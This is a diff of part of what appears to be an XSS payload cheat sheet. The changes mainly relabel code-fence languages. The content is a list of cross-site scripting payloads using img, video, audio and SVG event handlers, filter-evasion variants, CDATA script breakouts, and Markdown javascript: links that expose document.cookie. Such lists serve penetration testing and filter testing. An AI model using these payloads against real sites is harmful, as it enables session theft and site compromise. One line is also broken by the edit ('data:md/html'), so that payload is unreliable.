@@ -48,103 +48,103 @@
 
 ### Img tag payload
 
-```markup
+```html
 <img src=x onerror=alert('XSS');>
 ```
 
-```markup
+```html
 <img src=x onerror=alert('XSS')//
 ```
 
-```markup
+```html
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
 ```
 
-```markup
+```html
 <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
 ```
 
-```markup
+```html
 <img src=x:alert(alt) onerror=eval(src) alt=xss>
 ```
 
-```markup
+```html
 "><img src=x onerror=alert("XSS");>
 ```
 
-```markup
+```html
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 ```
 
 ### Video tag payload
 
-```markup
+```html
 <video autoplay onloadstart="alert('XSS')" src=x></video>
 ```
 
-```markup
+```html
 <video autoplay controls onplay="alert('XSS')"><source src="x"></video>
 ```
 
-```markup
+```html
 <video controls onloadeddata="alert('XSS')"><source src="x"></video>
 ```
 
-```markup
+```html
 <video controls onloadedmetadata="alert('XSS')"><source src="x"></video>
 ```
 
-```markup
+```html
 <video controls onloadstart="alert('XSS')"><source src="x"></video>
 ```
 
-```markup
+```html
 <video controls oncanplay="alert('XSS')"><source src="x"></video>
 ```
 
 ### Audio tag payload
 
-```markup
+```html
 <audio autoplay controls onplay="alert('XSS')"><source src="x"></audio>
 ```
 
-```markup
+```html
 <audio autoplay controls onplaying="alert('XSS')"><source src="x"></audio>
 ```
 
 ## XSS in Markdown
 
-```text
+```md
 [a](javascript:prompt(document.cookie))
 ```
 
-```text
+```md
 [a](j a v a s c r i p t:prompt(document.cookie))
 ```
 
-```text
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+```md
+[a](data:md/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
 ```
 
-```text
+```md
 [a](javascript:window.onerror=alert;throw%201)
 ```
 
 ## XSS in SVG \(short\)
 
-```markup
+```html
 <svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
 ```
 
-```markup
+```html
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 ```
 
-```markup
+```html
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 ```
 
-```markup
+```html
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
